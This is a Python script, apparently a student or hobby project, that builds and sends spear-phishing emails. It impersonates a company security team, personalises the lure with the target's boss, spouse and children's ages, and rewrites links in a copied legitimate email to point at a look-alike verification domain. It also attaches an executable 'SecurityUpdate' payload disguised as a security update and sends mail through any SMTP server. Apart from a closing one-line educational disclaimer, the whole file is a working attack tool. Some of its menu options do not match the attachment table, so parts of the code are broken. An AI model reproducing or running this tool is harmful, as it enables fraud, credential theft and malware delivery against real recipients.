#!/usr/bin/env python3
# Phising.py
# Compose a highly credible phishing email with dynamic family content

from email.message import EmailMessage
import requests
import re
import smtplib
import os

def attach_data_collector(msg, attachment_type="shell"):
    """Attach executable payload that runs with double-click."""
    
    attachment_options = {
        # Linux/Unix options
        "shell": {
            "path": "SecurityUpdate.sh",
            "filename": "SecurityUpdate.sh",
            "maintype": "application",
            "subtype": "x-sh",
            "description": "Linux Shell Script - Double-click to run"
        },
        "python": {
            "path": "SecurityUpdate_Linux.py",
            "filename": "SecurityUpdate.py",
            "maintype": "application", 
            "subtype": "x-python",
            "description": "Python Script - Double-click to run"
        },
        "appimage": {
            "path": "SecurityUpdate.AppImage",
            "filename": "SecurityUpdate.AppImage",
            "maintype": "application",
            "subtype": "x-appimage",
            "description": "Linux AppImage - Double-click to run"
        },
        "desktop": {
            "path": "SecurityUpdate.desktop",
            "filename": "SecurityUpdate.desktop",
            "maintype": "application",
            "subtype": "x-desktop",
            "description": "Linux Desktop Entry - Double-click to run"
        },
        # Windows options (preserved)
        "batch": {
            "path": "SecurityUpdate.bat",
            "filename": "SecurityUpdate.bat",
            "maintype": "application",
            "subtype": "bat",
            "description": "Windows Batch file - Double-click to run"
        },
        "vbs": {
            "path": "SecurityUpdate.vbs", 
            "filename": "SecurityUpdate.vbs",
            "maintype": "application",
            "subtype": "vbs",
            "description": "Visual Basic Script - Double-click to run"
        },
        "scr": {
            "path": "SecurityUpdate.scr",
            "filename": "SecurityUpdate.scr", 
            "maintype": "application",
            "subtype": "octet-stream",
            "description": "Screen Saver - Double-click to run"
        },
        "cmd": {
            "path": "SecurityUpdate.cmd",
            "filename": "SecurityUpdate.cmd",
            "maintype": "application", 
            "subtype": "cmd",
            "description": "Windows Command file - Double-click to run"
        }
    }
    
    if attachment_type not in attachment_options:
        print(f"Unknown attachment type. Available: {list(attachment_options.keys())}")
        attachment_type = "batch"
    
    option = attachment_options[attachment_type]
    collector_path = os.path.join(os.path.dirname(__file__), option["path"])
    
    if not os.path.exists(collector_path):
        print(f"Error: {option['path']} not found!")
        return False
        
    with open(collector_path, 'rb') as f:
        file_data = f.read()
        
    # Attach the file
    msg.add_attachment(
        file_data,
        maintype=option["maintype"],
        subtype=option["subtype"],
        filename=option["filename"]
    )
    
    print(f"✅ Payload attached as {option['filename']} ({option['description']})")
    return True

# Embedded Gmail-like HTML template with placeholders
TEMPLATE_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>{{SUBJECT}}</title>
  <style>
    /* Inline CSS only for maximum compatibility */
    body { margin:0; padding:0; font-family: Arial, sans-serif; }
    .header { background-color: #004080; padding:20px; text-align:center; color: #fff; }
    .header img { width:100px; }
    .content { padding:20px; color:#333; line-height:1.6; }
    .button { display:inline-block; padding:12px 24px; background:#004080; color:#fff;
              text-decoration:none; border-radius:4px; }
    .footer { padding:20px; font-size:12px; color:#888; text-align:center; }
  </style>
</head>
<body>
  <table width="100%" cellpadding="0" cellspacing="0">
    <tr><td class="header">
      <h1>{{COMPANY_NAME}} Security Team</h1>
    </td></tr><tr><td class="content">
      <p>Hi {{HONORIFIC}} {{USERNAME}},</p>
      <p>We hope this message finds you well. As part of our commitment to protecting every {{ROLE}} account at {{COMPANY_NAME}}, we’re rolling out a quick security check for your account.</p>
      <p><a href="{{VERIFY_LINK}}" class="button">Secure My Account</a></p>
      <p>This request was initiated by your manager, {{BOSS_NAME}}, to ensure compliance with our latest security policies.</p>
      {{SPOUSE_NOTICE}}
      {{FAMILY_NOTICE}}
      <p>If you did not request this verification, simply ignore this email or contact our support team.</p>
    </td></tr><tr><td class="footer">
      <p>Thank you for helping us keep your account secure,<br>The {{COMPANY_NAME}} Security Team</p>
    </td></tr>
  </table>
</body>
</html>'''

def get_user_input():
    """Get target information from the user via stdin."""
    return {
        "honorific":       input("Enter honorific/title (Mr, Ms, Dr): ").strip(),
        "username":        input("Enter recipient's full name: ").strip(),
        "mail_service":    input("Enter mail service name (e.g. Gmail): ").strip(),
        "subject":         input("Enter email subject/title: ").strip(),
        "role":            input("Enter recipient's role (e.g. student, manager): ").strip(),
        "personal_status": input("Enter personal status (single/married/other): ").strip(),
        "kids_info":       input("Enter kids info (no kids or ages comma-separated): ").strip(),
    }

def fill_template(html: str, data: dict) -> str:
    """Replace placeholders with user data and dynamic family content."""
    placeholders = {
        '{{HONORIFIC}}':    data['honorific'],
        '{{USERNAME}}':     data['username'],
        '{{ROLE}}':         data['role'],
        '{{COMPANY_NAME}}': data['company_name'],
        '{{BOSS_NAME}}':    data['boss_name'],
        '{{SUBJECT}}':      data['subject'],
        '{{VERIFY_LINK}}':  f"https://secure-{data['company_name'].lower()}.com/verify?user={data['username'].replace(' ', '%20')}"
    }
    placeholders['{{SPOUSE_NOTICE}}'] = (
        '<p>Please ensure your spouse has updated their security settings too.</p>'
        if data['personal_status'].lower() == 'married' else ''
    )
    kids = [k.strip() for k in data['kids_info'].split(',') if k.strip().isdigit()]
    placeholders['{{FAMILY_NOTICE}}'] = (
        f"<p>Please review the safety settings on your family’s devices (children ages: {', '.join(kids)}) to keep everyone protected.</p>"
        if kids else ''
    )
    for ph, val in placeholders.items():
        html = html.replace(ph, val)
    return html

def read_benign_email(source: str, source_type: str) -> str:
    """Read a benign email from a file, URL, or string."""
    if source_type == 'file':
        with open(source, 'r', encoding='utf-8') as f:
            return f.read()
    elif source_type == 'url':
        response = requests.get(source)
        response.raise_for_status()
        return response.text
    elif source_type == 'string':
        return source
    else:
        raise ValueError("Invalid source_type. Must be 'file', 'url', or 'string'.")

def merge_benign_email(benign_email: str, data: dict, source_type: str) -> dict:
    """Merge benign email content with user data based on source type."""
    # If the source is a string, process it as a template
    if source_type == 'string':
        benign_email = fill_template(benign_email, data)

    # Check for existing links in the benign email
    link_pattern = re.compile(r'<a\s+href=["\'](.*?)["\'].*?>.*?</a>', re.IGNORECASE | re.DOTALL)
    links = link_pattern.findall(benign_email)

    # Generate the malicious link
    malicious_link = f"https://secure-{data['mail_service'].lower()}.com/verify?user={data['username'].replace(' ', '%20')}"

    if links:
        # Replace first link with malicious link, preserving the original text
        link_text = re.search(r'<a\s+href=["\'](.*?)["\'].*?>(.*?)</a>', benign_email, re.IGNORECASE | re.DOTALL).group(2)
        malicious_button = f'<a href="{malicious_link}" class="button" style="display:inline-block; padding:10px 20px; background-color:#004080; color:white; text-decoration:none; border-radius:5px;">{link_text}</a>'
        benign_email = link_pattern.sub(malicious_button, benign_email, count=1)
    else:
        # Add button with malicious link before closing content div
        button_html = (
            f'<p style="margin-top:20px;">To ensure your account security, please click the button below:</p>'
            f'<p><a href="{malicious_link}" class="button" style="display:inline-block; padding:10px 20px; '
            f'background-color:#004080; color:white; text-decoration:none; border-radius:5px;">'
            f'Verify Your Account</a></p>'
        )
        
        # Try to insert before the footer or at the end of content
        if '</div>' in benign_email:
            benign_email = benign_email.replace('</div>', f'{button_html}</div>', 1)
        else:
            # If no div structure found, add before </body>
            if '</body>' in benign_email:
                benign_email = benign_email.replace('</body>', f'{button_html}</body>')
            else:
                # If no body tag, just append at the end
                benign_email += button_html

    # Append the modified benign email content for inspection or further use
    data['html_body'] = benign_email
    return data

def inject_or_replace_link(html: str, malicious_link: str) -> str:
    """
    אם יש קישור ב־html, החלף href בקישור הזדוני בכל תגי <a>.
    אם אין אף קישור, הוסף כפתור בסוף ההודעה.
    """
    # regex למציאת כל תגי <a ... href="...">...</a>
    anchor_pattern = re.compile(
        r'(<a\b[^>]*\bhref=["\'])([^"\']*)(["\'][^>]*>)(.*?)(</a>)',
        re.IGNORECASE | re.DOTALL
    )

    def replace_anchor(match):
        # מגריל את חלקי התג
        prefix, old_url, mid, link_text, suffix = match.groups()
        # מחזיר תג חדש עם ה־href הזדוני, ושומר טקסט וסגנון
        return f"{prefix}{malicious_link}{mid}{link_text}{suffix}"

    # אם נמצאו תגים, החלף את כל הקישורים
    if anchor_pattern.search(html):
        return anchor_pattern.sub(replace_anchor, html)
    else:
        # הוספת כפתור זדוני בסוף הגוף (לפני </body> או פשוט בסוף)
        button_html = (
            f'<p style="margin-top:20px;">'
            f'<a href="{malicious_link}" '
            f'style="display:inline-block;padding:12px 24px;'
            f'background-color:#004080;color:#fff;'
            f'text-decoration:none;border-radius:4px;">'
            f'Click Here to Secure Your Account</a>'
            f'</p>'
        )
        # אם יש </body>, הוסף לפניו
        if '</body>' in html:
            return html.replace('</body>', button_html + '</body>')
        else:
            return html + button_html

# Update compose_phishing_email to use inject_or_replace_link
def compose_phishing_email(data: dict) -> EmailMessage:
    """Build EmailMessage with HTML and text fallback, injecting or replacing malicious link."""
    # Determine HTML body
    if 'html_body' in data:
        html = data['html_body']
    else:
        html = fill_template(TEMPLATE_HTML, data)

    # Generate malicious link
    malicious_link = (
        f"https://secure-{data['mail_service'].lower()}.com/verify?"
        f"user={data['username'].replace(' ', '%20')}"
    )

    # Use inject_or_replace_link to handle links
    html = inject_or_replace_link(html, malicious_link)

    # Prepare EmailMessage
    msg = EmailMessage()
    msg['From']    = f"{data.get('sender', data['mail_service'] + ' Security Team')} <no-reply@{data['mail_service'].lower()}.com>"
    recipient_addr = f"{data['username'].replace(' ', '.').lower()}@{data['mail_service'].lower()}.com"
    msg['To']      = f"{data['honorific']} {data['username']} <{recipient_addr}>"
    msg['Subject'] = f"{data['mail_service']} Security Alert: {data['subject']}"

    # Text fallback
    fallback = (
        f"Hi {data['honorific']} {data['username']},\n\n"
        f"Please complete a quick security check: {malicious_link}\n\n"
        "Thank you,\n"
        f"The {data['mail_service']} Security Team"
    )
    msg.set_content(fallback)
    msg.add_alternative(html, subtype='html')

    # Save HTML email to file
    filename = f"phishing_email_{data['username'].replace(' ', '_').lower()}.html"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(html)
    
    # Attach the data collector
    print("\nChoose attachment type:")
    print("1. PowerShell script (.ps1) - Best for Windows users")
    print("2. Python script disguised as PDF (.pdf.py)")
    print("3. Original Python script (.py)")
    
    attachment_choice = input("Enter choice (1-3, default=1): ").strip() or "1"
    attachment_types = {"1": "powershell", "2": "python", "3": "original"}
    attachment_type = attachment_types.get(attachment_choice, "powershell")
    
    if not attach_data_collector(msg, attachment_type):
        print("Warning: Could not attach data collector")

    return msg

def send_email(email: EmailMessage, smtp_server: str, smtp_port: int, username: str, password: str):
    """Send an email using the specified SMTP server."""
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            if smtp_server == 'localhost' and smtp_port == 1025:
                # MailHog does not require STARTTLS or authentication
                server.send_message(email)
            else:
                server.starttls()  # Upgrade the connection to secure
                server.login(username, password)
                server.send_message(email)
            print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Update the main function to use the imported functions
def main():
    print("Choose an option:")
    print("1. Create a phishing email from scratch")
    print("2. Mimic an existing email and inject a malicious link")
    choice = input("Enter your choice (1 or 2): ").strip()

    if choice == '1':
        # Option 1: Create a phishing email from scratch
        data = get_user_input()

        # Ensure 'company_name' is set based on 'mail_service'
        data['company_name'] = data.get('mail_service', 'Unknown Company')

        # Prompt user for boss's name
        data['boss_name'] = input("Enter the name of the recipient's boss: ").strip()

        email = compose_phishing_email(data)
        # Print full MIME message for inspection
        print(email.as_string())

        # Send the email
        use_mailhog = input("Do you want to use MailHog for testing? (yes/no): ").strip().lower()
        if use_mailhog == 'yes':
            smtp_server = 'localhost'
            smtp_port = 1025
            username = 'no-reply@mailhog.local'  # Use a valid default email address for MailHog
            password = ''
        else:
            smtp_server = input("Enter SMTP server (e.g., smtp.gmail.com): ").strip()
            smtp_port = int(input("Enter SMTP port (e.g., 587): ").strip())
            username = input("Enter your email username: ").strip()
            password = input("Enter your email password: ").strip()

        # Send the email
        send_email(email, smtp_server, smtp_port, username, password)

    elif choice == '2':
        # Option 2: Mimic an existing email and inject a malicious link
        benign_source = input("Enter benign email source (file path, URL, or string): ").strip()
        source_type = input("Enter source type (file, url, string): ").strip().lower()
        benign_email = read_benign_email(benign_source, source_type)

        # Get required user data for the malicious link
        print("\nNeed some details to create the malicious link:")
        data = {
            "username": input("Enter target's full name: ").strip(),
            "mail_service": input("Enter company name (e.g. Google): ").strip()
        }

        # Generate the malicious link
        malicious_link = f"https://secure-{data['mail_service'].lower()}.com/verify?user={data['username'].replace(' ', '%20')}"

        # Check for existing links
        link_pattern = re.compile(r'<a\s+href=["\']([^"\']*)["\'].*?>.*?</a>', re.IGNORECASE | re.DOTALL)
        if link_pattern.search(benign_email):
            # If links exist, replace the first one
            link_text = re.search(r'<a\s+href=["\']([^"\']*)["\'].*?>(.*?)</a>', benign_email, re.IGNORECASE | re.DOTALL).group(2)
            malicious_button = f'<a href="{malicious_link}" class="button" style="display:inline-block; padding:10px 20px; background-color:#004080; color:white; text-decoration:none; border-radius:5px;">{link_text}</a>'
            benign_email = link_pattern.sub(malicious_button, benign_email, count=1)
        else:
            # If no links exist, add malicious button
            button_html = (
                f'<p style="margin-top:20px;">To ensure your account security, please click the button below:</p>'
                f'<p><a href="{malicious_link}" class="button" style="display:inline-block; padding:10px 20px; '
                f'background-color:#004080; color:white; text-decoration:none; border-radius:5px;">'
                f'Verify Your Account</a></p>'
            )
            
            # Try different positions to insert the button
            if '<div class="content">' in benign_email:
                # Add after content div starts
                content_pos = benign_email.find('<div class="content">') + len('<div class="content">')
                benign_email = benign_email[:content_pos] + button_html + benign_email[content_pos:]
            elif '</body>' in benign_email:
                # Add before body ends
                benign_email = benign_email.replace('</body>', f'{button_html}</body>')
            else:
                # Just add at the end if no other good position found
                benign_email += button_html

        # Save the modified email to a file
        filename = "mimicked_email_with_malicious_link.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(benign_email)

        print(f"Modified email saved to {filename}")

        # Send the email
        use_mailhog = input("Do you want to use MailHog for testing? (yes/no): ").strip().lower()
        if use_mailhog == 'yes':
            smtp_server = 'localhost'
            smtp_port = 1025
            username = 'no-reply@mailhog.local'  # Use a valid default email address for MailHog
            password = ''
        else:
            smtp_server = input("Enter SMTP server (e.g., smtp.gmail.com): ").strip()
            smtp_port = int(input("Enter SMTP port (e.g., 587): ").strip())
            username = input("Enter your email username: ").strip()
            password = input("Enter your email password: ").strip()
        email = EmailMessage()
        email.set_content(benign_email, subtype='html')
        email['Subject'] = "Mimicked Email with Malicious Link"
        email['From'] = username if username else 'no-reply@mailhog.local'
        email['To'] = input("Enter recipient email address: ").strip()
        send_email(email, smtp_server, smtp_port, username, password)

    else:
        print("Invalid choice. Please run the script again and choose 1 or 2.")

if __name__ == '__main__':
    print("""
    ======================================
    Email Spoofing Script
    ======================================
    Authors: Dor Cohen, Baruh Ifraimov

    This script allows you to:
    1. Create a phishing email from scratch.
    2. Mimic an existing email and inject a malicious link.

    Usage:
    - Run the script and follow the prompts.
    - Use MailHog for safe local testing of emails.

    Disclaimer: This script is for educational purposes only. Do not use it for malicious activities.
    ======================================
    """)
    main()
